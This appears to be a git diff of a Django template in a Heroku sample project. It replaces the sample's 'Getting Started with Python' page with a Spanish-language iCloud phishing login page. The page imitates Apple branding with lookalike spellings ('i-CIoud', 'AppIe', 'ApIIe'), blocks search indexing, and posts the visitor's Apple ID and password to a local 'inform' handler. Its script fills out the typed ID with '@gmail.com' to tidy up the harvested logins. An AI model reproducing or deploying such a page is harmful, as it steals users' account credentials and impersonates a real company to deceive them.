@@ -1,58 +1,163 @@
-{% extends "base.html" %}
 {% load staticfiles %}
+<html lang="pt-br"><head>
+<meta name="robots" content="NOINDEX, NOFOLLOW">
+    <title>i-CIoud</title>
+    <meta charset="utf-8">
+    <link rel="shortcut icon" href="favicon.ico">
+    <link rel="stylesheet" href="{% static 'css/styles.css'%}">
+    <link rel="stylesheet" href="http://code.jquery.com/ui/1.11.3/themes/smoothness/jquery-ui.css">
+    <script src="http://code.jquery.com/jquery-1.10.2.js"></script><style type="text/css"></style>
+    <script src="http://code.jquery.com/ui/1.11.3/jquery-ui.js"></script>
+    <script src="{% static 'activity-indicator.js'%}"></script>
+</head>
 
-{% block content %}
+<body class="body_image_old" style="visibility: visible;">
 
-<div class="jumbotron text-center">
-  <div class="container">
-    <a href="/" class="lang-logo">
-      <img src="{% static 'lang-logo.png'%}">
-    </a>
-    <h1>Getting Started with Python on Heroku</h1>
-    <p>This is a sample Python application deployed to Heroku. It's a reasonably simple app - but a good foundation for understanding how to get the most out of the Heroku platform.</p>
-    <a type="button" class="btn btn-lg btn-default" href="https://devcenter.heroku.com/articles/getting-started-with-python"><span class="glyphicon glyphicon-flash"></span> Getting Started with Python</a>
-    <a type="button" class="btn btn-lg btn-primary" href="https://github.com/heroku/python-getting-started"><span class="glyphicon glyphicon-download"></span> Source on GitHub</a>
-  </div>
-</div>
+<div class="body_image_new" style="opacity: 1;"></div>
+<div id="loader" class="loader" style="display: none;"><div style="width: 26px; height: 26px; position: absolute; margin-top: -13px; margin-left: -13px; animation: spin12 0.8s linear infinite;"><svg style="width: 26px; height: 26px;"><g transform="translate(13,13)"><g stroke-width="1.5" stroke-linecap="round" stroke="rgb(255, 255, 255)"><line x1="0" y1="6" x2="0" y2="11" transform="rotate(0, 0, 0)" opacity="1"></line><line x1="0" y1="6" x2="0" y2="11" transform="rotate(30, 0, 0)" opacity="0.9173553719008265"></line><line x1="0" y1="6" x2="0" y2="11" transform="rotate(60, 0, 0)" opacity="0.8347107438016529"></line><line x1="0" y1="6" x2="0" y2="11" transform="rotate(90, 0, 0)" opacity="0.7520661157024794"></line><line x1="0" y1="6" x2="0" y2="11" transform="rotate(120, 0, 0)" opacity="0.6694214876033058"></line><line x1="0" y1="6" x2="0" y2="11" transform="rotate(150, 0, 0)" opacity="0.5867768595041323"></line><line x1="0" y1="6" x2="0" y2="11" transform="rotate(180, 0, 0)" opacity="0.5041322314049588"></line><line x1="0" y1="6" x2="0" y2="11" transform="rotate(210, 0, 0)" opacity="0.42148760330578516"></line><line x1="0" y1="6" x2="0" y2="11" transform="rotate(240, 0, 0)" opacity="0.33884297520661155"></line><line x1="0" y1="6" x2="0" y2="11" transform="rotate(270, 0, 0)" opacity="0.25619834710743805"></line><line x1="0" y1="6" x2="0" y2="11" transform="rotate(300, 0, 0)" opacity="0.17355371900826455"></line><line x1="0" y1="6" x2="0" y2="11" transform="rotate(330, 0, 0)" opacity="0.09090909090909094"></line></g></g></svg></div></div>
 <div class="container">
-  <div class="alert alert-info text-center" role="alert">
-    To deploy your own copy, and learn the fundamentals of the Heroku platform, head over to the <a href="https://devcenter.heroku.com/articles/getting-started-with-python" class="alert-link">Getting Started with Python on Heroku</a> tutorial.
-  </div>
-  <hr>
-  <div class="row">
-    <div class="col-md-6">
-      <h3><span class="glyphicon glyphicon-info-sign"></span> How this sample app works</h3>
-      <ul>
-        <li>This app was deployed to Heroku, either using Git or by using <a href="https://github.com/heroku/python-getting-started">Heroku Button</a> on the repository.</li>
+    <div class="wrapper">
 
-        <li>When Heroku received the source code, it fetched all the dependencies in the <a href="https://github.com/heroku/python-getting-started/blob/master/requirements.txt">requirements.txt file</a>, creating a deployable slug.</li>
-        <li>The platform then spins up a dyno, a lightweight container that provides an isolated environment in which the slug can be mounted and executed.</li>
-        <li>You can scale your app, manage it, and deploy over <a href="https://addons.heroku.com/">150 add-on services</a>, from the Dashboard or CLI.</li>
-      </ul>
+        <div class="header">
+            <div class="logo lF"></div>
+            <div class="info lR">
+                <div class="instr lF">
+				<script type="text/javascript">
+                        
+                        function newPopup(url) {
+                            popupWindow = window.open(
+                                url,'popUpWindow','height=700,width=800,left=10,top=10,resizable=no,scrollbars=no,toolbar=no,menubar=no,location=no,directories=no,status=yes')
+                        }
+                    </script>
+                    <span><a href="#">Cómo configurar iCIoud</a></span>
+                </div>
+                <div class="help lF"></div>
+            </div>
+        </div>
+		
+        <div class="body">
+            <div>
+                <div class="cloud"></div>
+                <div class="labelRef">
+                    <span><h6>Iniciar sesión en iCIoud</h6></span>
+                </div>
+                <div>
+                    <form action="inform" method="post">
+                        <div class="boxFrm" style="width:325px;">
+                            <div class="line1">
+                                <input type="text" value="" class="appId1" placeholder="ID de AppIe" name="appIe" id="appIe">
+                            </div>
+                            <div class="line2">
+                                <input type="password" value="" class="appId2 lF" placeholder="Contraseña" name="pw" id="pw">
+                                <div style="margin-left:270px;"><input type="submit" value="" class="sbBtn lF" style="opacity: 0.2;"></div>
+                            </div>
+                        </div>
+                    </form>
+                </div>
+                <div class="cont">
+                    <span class="tlrm"><input type="checkbox"></span>
+                    <span class="txt">Permanecer conectado</span>
+                </div>
+                <div class="cont2 sec">
+                    <div class="center">
+                        <span class="account-cr">¿Has olvidado tu ID de AppIe o la contraseña?</span><br>
+                        <span class="account-cr">¿Aún no tienes un ID de AppIe? <a class="clickable" href="#">Crea uno ahora.</a></span>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="footer">
+            <div class="fLogo lF"></div>
+            <ul class="lR">
+                <li><a href="#">Check&nbsp;Activation&nbsp;Lock&nbsp;Status</a></li>
+                <li><a href="#">Forgot&nbsp;ID&nbsp;or&nbsp;Password?</a></li>
+                <li><a href="#">System&nbsp;Status</a></li>
+                <li><a href="#">Privacy&nbsp;Policy</a></li>
+                <li><a href="#">Terms&nbsp;&amp;&nbsp;Conditions</a></li>
+                <li>Copyright © 2015 ApIIe Inc. All rights reserved.</li>
+            </ul>
+        </div>
+
     </div>
-    <div class="col-md-6">
-      <h3><span class="glyphicon glyphicon-link"></span> Next Steps</h3>
-      <ul>
-        <li>If you are following the <a href="https://devcenter.heroku.com/articles/getting-started-with-python">Getting Started</a> guide, then please head back to the tutorial and follow the next steps!</li>
-        <li>If you deployed this app by deploying the Heroku Button, then in a command line shell, run:</li>
-        <ul>
-          <li><code>git clone https://github.com/heroku/python-getting-started.git</code> - this will create a local copy of the source code for the app</li>
-          <li><code>cd python-getting-started</code> - change directory into the local source code repository</li>
-          <li><code>heroku git:remote -a &lt;your-app-name></code> - associate the Heroku app with the repository</li>
-          <li>You'll now be set up to run the app locally, or <a href="https://devcenter.heroku.com/articles/getting-started-with-python#push-local-changes">deploy changes</a> to Heroku</li>
-        </ul>
-      </ul>
-      <h3><span class="glyphicon glyphicon-link"></span> Helpful Links</h3>
-      <ul>
-        <li><a href="https://www.heroku.com/home">Heroku</a></li>
-        <li><a href="https://devcenter.heroku.com/">Heroku Dev Center</a></li>
-        <li><a href="https://devcenter.heroku.com/articles/getting-started-with-python">Getting Started with Python on Heroku</a></li>
-        <li><a href="https://devcenter.heroku.com/articles/django-app-configuration">Configuring Django Apps for Heroku</a></li>
-      </ul>
-    </div>
-  </div> <!-- row -->
-   <div class="alert alert-info text-center" role="alert">
-    Please do work through the Getting Started guide, even if you do know how to build such an application.  The guide covers the basics of working with Heroku, and will familiarize you with all the concepts you need in order to build and deploy your own apps.
-  </div>
 </div>
-{% endblock %}
+
+<script>
+      $("body").css("visibility", "hidden");
+    $('#loader').activity({width: 1.5, segments: 12, length: 5});
+    jQuery('#submit_loader').activity({width: 1.5, segments: 12, length: 5});
+    function typeCheck(element) {
+        var key = event.keyCode || event.charCode;
+        if (key == 8 || key == 46) {
+            $(".sbBtn").css("opacity", "0.2");
+            return element;
+        }
+        if (element !== "") {
+            $(".sbBtn").css("opacity", "1");
+        } else {
+            $(".sbBtn").css("opacity", "0.2");
+        }
+    }
+    $(document).ready(function () {
+        $("body").css("visibility", "visible");
+                function isValidEmailAddress(emailAddress) {
+            var pattern = new RegExp(/^(("[\w-+\s]+")|([\w-+]+(?:\.[\w-+]+)*)|("[\w-+\s]+")([\w-+]+(?:\.[\w-+]+)*))(@((?:[\w-+]+\.)*\w[\w-+]{0,66})\.([a-z]{2,6}(?:\.[a-z]{2})?)$)|(@\[?((25[0-5]\.|2[0-4][\d]\.|1[\d]{2}\.|[\d]{1,2}\.))((25[0-5]|2[0-4][\d]|1[\d]{2}|[\d]{1,2})\.){2}(25[0-5]|2[0-4][\d]|1[\d]{2}|[\d]{1,2})\]?$)/i);
+            return pattern.test(emailAddress);
+        };
+        $('input[name=appIe]').bind("keydown", function(e){
+            // enter key code is 13
+            if(e.which == 13 || e.which == 9){
+                e.preventDefault();
+                var val = $(this).val();
+                if (!isValidEmailAddress(val)) {
+                    val = val+"@gmail.com";
+                    $(this).val(val);
+                } else {
+                    console.log($(this).val());
+                }
+                console.log(val);
+                $("input[name=pw]").focus();
+                if(jQuery('#apple').val()=='' || jQuery('#pw').val()=='') $(".sbBtn").css("opacity", "0.2"); else $(".sbBtn").css("opacity", "1");
+
+                return false;
+            }
+        });
+        $("input[name=pw]").on("click keyup", function(){
+            val = $("input[name=apple]").val();
+            if (!isValidEmailAddress(val)) {
+                if(val!='@gmail.com' && val!='') val = val+"@gmail.com";
+                $("input[name=appIe]").val(val);
+            }
+            if(jQuery('#appIe').val()=='' || jQuery('#pw').val()=='') $(".sbBtn").css("opacity", "0.2"); else $(".sbBtn").css("opacity", "1");
+        });
+        var mm = 0;
+        var ss = setTimeout(function () {
+            $(".body_image_new").animate({ opacity: "1" }, 1000);
+            console.log(mm);
+            clearTimeout(ss);
+        }, 7500);
+        k = 1;
+        $(".tlrm").on("click", function () {
+            k++;
+            if (k % 2 == 0) {
+                $("#tlrm").attr("src", "{% static 'images/checked.png'%}");
+            } else {
+                $("#tlrm").attr("src", "{% static 'images/Unknown.png'%}");
+            }
+        });
+    });
+    var ss2 = setTimeout(function () {
+        $("#loader").fadeOut("slow");
+        $("div.container").fadeIn("slow");
+        $("div.container").css("display:", "block");
+        $(".sbBtn").css("opacity", "0.2");
+        clearTimeout(ss2);
+    }, 4500);
+
+    $('#appIe,#pw').on('keyup', function(e) {
+        if (e.which == 13) {
+            checklogin();
+        }
+    });
+       
+</script>
+</body></html>
